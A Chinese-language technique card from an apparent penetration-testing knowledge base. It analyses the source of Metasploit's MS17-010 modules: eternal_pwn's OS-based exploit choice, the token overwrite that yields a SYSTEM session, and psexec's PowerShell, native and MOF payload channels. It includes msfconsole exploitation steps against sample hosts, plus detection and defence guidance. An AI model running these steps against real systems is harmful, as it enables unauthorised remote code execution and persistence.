---
id: tools-metasploit-ms17-010-module-family-source-analysis
title: MSF MS17-010 模块族源码分析：eternal_pwn 按 OS/命名管道选择利用并覆盖 token，command/psexec 的四种载荷通道
type: scenario
domain: tools
path: tools/metasploit
technique: ms17-010-msf-module-eternal-pwn-payload-modes
aliases:
- ms17_010_command 模块原理
- ms17_010_psexec 模块原理
- eternal_pwn
- go_fish
- exploit_fish_barrel
- exploit_matched_pairs
- SESSION_ISNULL_OFFSET
- MS17-010 PowerShell target
- MS17-010 Native upload
- MS17-010 MOF upload
tags:
- metasploit
- ms17-010
- eternalblue
- eternalromance
- eternalchampion
- eternalsynergy
- psexec
- smb
- windows
- token
- module-analysis
cve:
- CVE-2017-0143
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V667
  verified_at: '2026-11-13T08:28:47+08:00'
  notes: 已对照原文 38 图逐张核对：模块分工/选项与图01-02一致；eternal_pwn 的 fingerprint_os→go_fish→exploit_fish_barrel/exploit_matched_pairs、write_what_where(\x00\x01, session+SESSION_ISNULL_OFFSET)、modify_token 与图08-09一致；execute_command 的 %COMSPEC% /C echo ^> %SYSTEMDRIVE%...txt > ...bat & start 与图13一致；svcctl DCE/RPC 367abb81-9844-35f1-ad32-98f038001003 v2.0、随机8位服务名/16位显示名、SERVICE_PERSIST、smb_read_file 回读、cleanup 仅删 bat 与图14-19一致；psexec 四 target Automatic/PowerShell/Native upload/MOF upload 与图21-35一致；eternalblue check 复用 scanner、x86 fail_with、EternalBlueWin8/Win7 分支与图40一致。修正 3 处：一句话结论不再称四模块共享同一主线（scanner 只探测、eternalblue 独立路径）；MOF __EventFilter 查询按图36改为 TargetInstance.__class = \MyClass@CLASS@；7045 ImagePath 描述按实际服务命令行改写。MOF upload 未打通（图24 报 no session），卡内已如实注明。未验证点：PoC 未本机复跑；原文只有模块目标支持范围，无组件受影响版本区间，未设 affected_versions；frontmatter 无 sources/source_url。
---

# 一句话结论

MSF 的 MS17-010 模块族分工为：`smb_ms17_010` 只做 IPC$/PeekNamedPipe 探测；`ms17_010_command` 与 `ms17_010_psexec` 共享同一条利用主线——先通过 SMBv1 事务/命名管道漏洞在内核拿到写原语，`eternal_pwn` 按 SMB 会话泄露的 peer OS 选择 `exploit_fish_barrel`（EternalChampion 系）或 `exploit_matched_pairs`（EternalRomance/EternalSynergy 系），再用 write-what-where 把当前会话 token 的 `IsNullSession` 置 0、`IsAdmin` 置 1 得到 SYSTEM 会话，之后 command 模块以“服务 + bat + 共享回读”执行单条命令、psexec 模块按 `Automatic`/`PowerShell`/`Native upload`/`MOF upload` 四种 target 之一投递载荷；`ms17_010_eternalblue` 则走独立的 EternalBlue 内核池破坏路径（仅 x64）。

# 原理

- **模块族分工**。`auxiliary/scanner/smb/smb_ms17_010` 只做探测（IPC$ + PeekNamedPipe 探针，命中 `STATUS_INSUFF_SERVER_RESOURCES` 即判定 likely vulnerable，可选 CHECK_ARCH/CHECK_DOPU/CHECK_PIPE）。`auxiliary/admin/smb/ms17_010_command` 复用同一套 `eternal_pwn`，把用户给出的 `COMMAND` 通过临时服务执行并回读输出。`exploit/windows/smb/ms17_010_psexec` 同样先 `eternal_pwn`，再用四种 target 之一投递回连载荷。`exploit/windows/smb/ms17_010_eternalblue` 走独立的 EternalBlue 内核池破坏路径，只支持 x64（x86 直接 `fail_with NoTarget`），check 阶段直接调用 `smb_ms17_010` 模块，并按 check 得到的 OS 在 `EternalBlueWin8`（Win8/10/2012/2012 R2）与 `EternalBlueWin7`（其余）两套 exploit 之间选择。
- **eternal_pwn 的 OS 指纹与 exploit 选择**。`fingerprint_os(simple.client.peer_native_os)` 解析 SMB 会话返回的原生 OS 字符串：Windows 10 / Server 2016 / 8 / Server 2012 / RT 9200 记为 `WIN8` 且 `go_fish=false`；Windows 7 / Server 2008 R2 / Storage 2008 R2 / Embedded Standard 7 记为 `WIN7` 且 `go_fish=false`；Server (R) 2008 / Vista 记为 `WIN7` 且 `go_fish=true`；Server 2003 记为 `WIN2K3`、5.1 记为 `WINXP`（x86）、XP 记为 `WINXP`（x64）、5.0 记为 `WIN2K`（x86），这些旧系统 `go_fish=true`；未命中的 OS 直接抛 `MS17_010_Error`。随后 `find_accessible_named_pipe` 按 `NAMED_PIPES` 字典探测目标可连接的命名管道，`go_fish=true` 走 `exploit_fish_barrel`，否则走 `exploit_matched_pairs`——即同一漏洞族里“按系统年龄与可用管道”切换不同的 SMBv1 事务利用实现，而不是所有目标都打 EternalBlue。
- **token 覆盖为何等效于提权**。利用成功后代码打印 “Built a write-what-where primitive...”，然后执行 `write_what_where("\x00\x01", @ctx['session'] + @ctx['SESSION_ISNULL_OFFSET'])`：SMB 会话对象持有的 token 里 `IsNullSession`（匿名会话标志）与 `IsAdmin` 相邻，写入 0x00 清掉匿名标志、0x01 置上管理员标志，再 `modify_token()` 使改动生效，SMB 会话立刻以 SYSTEM 权限运行（源码注释即 “IsNullSession = 0, IsAdmin = 1”；`@ctx['rekt']=true` 表示结束时要恢复 token）。因此后续所有 SMB 操作（写 `ADMIN$`/`C$`、绑定 `svcctl` 管道）都在 SYSTEM 上下文里完成，无需再本地提权。
- **command 模块的执行链**。`smb_pwn` 生成共享路径 `\#{WINPATH}\Temp\#{FILEPREFIX}#{随机16位}.txt/.bat`（WINPATH 默认 `WINDOWS`，落在 `SMBSHARE` 默认 `C$` 上），交给 `execute_command_with_output`：`execute_command` 把命令拼成 `%COMSPEC% /C echo <cmd> ^> %SYSTEMDRIVE%<text> > <bat> & %COMSPEC% /C start %COMSPEC% /C <bat>` 传给 `psexec`——外层 echo 先把“把命令输出重定向到 txt”的一行写进 bat，再启动 bat 执行真正的命令。`psexec` 经 `\svcctl` 命名管道（DCE/RPC 接口 `367abb81-9844-35f1-ad32-98f038001003` v2.0）`openscmmanagerw → createservicew → startservice → deleteservice`：服务名未指定时随机 8 位字母、显示名随机 16 位字母；`SERVICE_PERSIST=true` 时改为自启动且不删服务（持久化）。服务启动返回超时/失败是预期现象（cmd.exe 或 bat 不是合法服务程序），命令已执行；`get_output` 用 `smb_read_file` 读回 txt 输出，`cleanup_after` 用 `smb_file_rm` 删除 bat——注意只删 bat，不删 txt，文章截图确认 `C:\Windows\Temp` 残留多条随机 16 位字母的 .txt 命令输出文件。
- **psexec 模块的四种 target**。`smb_pwn` 按 `target.name` 分支：
  - `Automatic`：`powershell_installed?(SHARE, PSH_PATH)` 先经 SMB 判断目标是否存在 powershell.exe——`ADMIN$` 映射 `System32\WindowsPowerShell\v1.0\powershell.exe`、`C$` 映射 `Windows\System32\...`、其他共享用 `PSH_PATH`；存在则走 PowerShell 分支，否则 native 分支。
  - `PowerShell`：`execute_powershell_payload` 用 `cmd_psh_payload` 生成带混淆（字符串拼接 + Base64/Gzip）的 `powershell.exe -nop -w hidden -noni -c ...` 命令，交给同一个 `psexec` 服务执行；不落服务 exe，但依赖目标有 PowerShell。
  - `Native upload`：`native_upload` 用 `generate_payload_exe_service` 生成服务型 exe，经 SMB 写入共享（`SHARE` 含子目录时会拆路径逐级写），再按共享类型换算成本地路径——`ADMIN$` → `%SYSTEMROOT%\<随机8位>.exe`、盘符共享 → `C:\<file>`、其他 → `\\127.0.0.1\<share>\<path>`——最后 `psexec(file_location)` 以服务启动；默认 SERVICE_PERSIST=false 时用完删除上传 exe。
  - `MOF upload`：仅接受 `ADMIN$`（wbem 只工作于 ADMIN$）。`mof_upload` 先把 exe 写到 `\system32\<随机8位>.exe`，再用 `generate_mof` 生成随机 14 位字母数字的 `\system32\wbem\mof\*.MOF`：MOF 定义 `ActiveScriptEventConsumer`（JScript 用 `WScript.Shell.Run` 拉起该 exe）、`__EventFilter`（`SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = "\\MyClass@CLASS@"`）与 binding，另有一组 consumer/filter 在进程退出时删除 exe 与 MOF 自清理。该通道不建服务、不写计划任务，但执行依赖 WMI 对 `wbem\mof` 目录的自动编译（WMI 通常在服务启动时批量编译该目录下的 MOF）；文章环境中文件已成功落地（system32 下多个 73KB exe、MOF 目录下多个 .MOF 仍在根目录未进 good/bad），MSF 报 “Exploit completed, but no session was created”，即该模式未打通回连，复用时需考虑 WMI 编译触发条件与载荷/回连路径。
- **四种通道的取舍**：PowerShell 不落 exe、规避写服务文件但要求 PowerShell 可用且命令特征明显；native 最通用但落服务 exe；MOF 不创建服务/任务、仅两个文件且自清理，但触发依赖 WMI 自动编译；Automatic 即“有 PowerShell 就用 PowerShell，否则 native”。

# 触发条件

- 目标未安装 MS17-010 补丁、SMBv1 未禁用、445 对攻击者可达；`eternal_pwn` 的 OS 指纹必须命中上述列表（该模块族面向 Windows Server 2012 及以下，文章案例为 Server 2012 R2 与 Win7 x64）。
- 能匿名或用给定 SMBUser/SMBPass 建立 IPC$ 连接；`ms17_010_command` 与 `ms17_010_psexec` 要求 `find_accessible_named_pipe` 找到可连接管道（否则 exploit 选择失败）。
- command/native/MOF 通道需要对应共享可写（利用成功后的 SYSTEM 会话满足 `C$`/`ADMIN$` 写入）；PowerShell 通道额外要求目标存在 powershell.exe。
- `ms17_010_eternalblue` 仅 x64 目标，且目标为 Win7/2008 级（Win8/10/2012 用另一套 exploit 模块，不在该模块覆盖内）。

# 利用步骤

1. 探测：`use auxiliary/scanner/smb/smb_ms17_010`，`set RHOSTS <target>`，`run`，看到 “Host is likely VULNERABLE to MS17-010! - <OS>”。
2. 单命令执行（类控制台验证/无回连场景）：`use auxiliary/admin/smb/ms17_010_command`，`set RHOSTS <target>`，`set COMMAND "<命令>"`（默认 `net group "Domain Admins" /domain`），`run`；看到 “Overwrite complete... SYSTEM session obtained!” 与输出回读即成功。
3. 载荷上线：`use exploit/windows/smb/ms17_010_psexec`，`set RHOSTS <target>`，按目标能力 `set TARGET "PowerShell"`/`"Native upload"`/`"MOF upload"`（默认 Automatic），配置 payload（文章默认 `windows/meterpreter/reverse_tcp`），`run`。
4. Win7 x64 目标也可换 `use exploit/windows/smb/ms17_010_eternalblue`，`set RHOSTS <target>`，`run`；模块先用 scanner 做 check，再按 OS 选 EternalBlueWin7/Win8 并触发内核池利用。

# PoC

```text
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.1.9
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

msf6 > use auxiliary/admin/smb/ms17_010_command
msf6 auxiliary(admin/smb/ms17_010_command) > set RHOSTS 192.168.1.9
msf6 auxiliary(admin/smb/ms17_010_command) > run

msf6 > use exploit/windows/smb/ms17_010_psexec
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 192.168.1.9
msf6 exploit(windows/smb/ms17_010_psexec) > set TARGET "Native upload"   # 或 PowerShell / MOF upload / Automatic
msf6 exploit(windows/smb/ms17_010_psexec) > run

msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.15
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

# 变体与关联

- 与库内 `pentest/lateral-movement/ms17-010-eternalblue-psexec`（按 OS 选模块、拿 SYSTEM 的使用级流程）、`ms17-010-aux-command-telnet-lateral`（command 模块 + Telnet 横向）、`ms17-010-dll-payload-batch-admin`（msfvenom DLL + 第三方工具批量）互为补充：本卡聚焦 MSF 模块源码层的 `eternal_pwn` 机制、token 覆盖与四种载荷通道，解释“为什么选这个 target、失败在哪一步”。
- `SESSION_ISNULL_OFFSET` 覆盖思路可迁移到其他能读写 SMB 会话对象的 SMBv1 内存破坏漏洞；`eternal_pwn` 的 OS→exploit 映射也可作为判断目标应走 EternalBlue 还是 EternalRomance/Synergy/Champion 的依据。
- 清理缺陷可作检测/取证点：command 模式在 `%SYSTEMDRIVE%\WINDOWS\Temp` 留下随机 16 位字母 .txt；MOF 模式在 `system32` 与 `system32\wbem\mof` 留下随机名 exe/MOF（若 WMI 未编译则不会被自清理逻辑删除）。

# 检测与防御

- 根本措施：打 MS17-010 补丁、禁用 SMBv1、对 445 做网络隔离；限制匿名 IPC$ 访问。
- 模块族共同特征：445 上 IPC$ 连接后出现异常 PeekNamedPipe 探测、`svcctl` DCE/RPC 绑定、SMBv1 事务异常。
- command/native 通道：安全日志 7045 出现随机 8 位字母服务名（显示名随机 16 位），command 通道 ImagePath 为 cmd.exe 启动 `C:\Windows\Temp\*.bat` 的完整命令行，native 通道 ImagePath 指向 `%SYSTEMROOT%` 下随机 8 位 .exe，且服务很快被删除（7045 + 7036）；`C:\Windows\Temp` 下随机 16 位字母 .txt 命令输出是事后 IOC。
- PowerShell 通道：服务拉起 powershell.exe，命令行含 `-nop -w hidden -noni`；脚本块日志/AMSI 可捕获混淆后的 Base64/Gzip 载荷。
- MOF 通道：`system32\wbem\mof` 目录出现随机 14 位字母数字 .MOF、system32 根出现随机 8 位 exe；WMI-Activity 日志与 wmiprvse.exe 子进程可告警（该模式在文章环境未建会话，但文件落地特征明确）。
- 检测 `eternal_pwn` 本身：监控匿名 SMB 会话短时间内权限跳变（后续用 SYSTEM 写 ADMIN$），以及对命名管道字典的高频连接尝试。
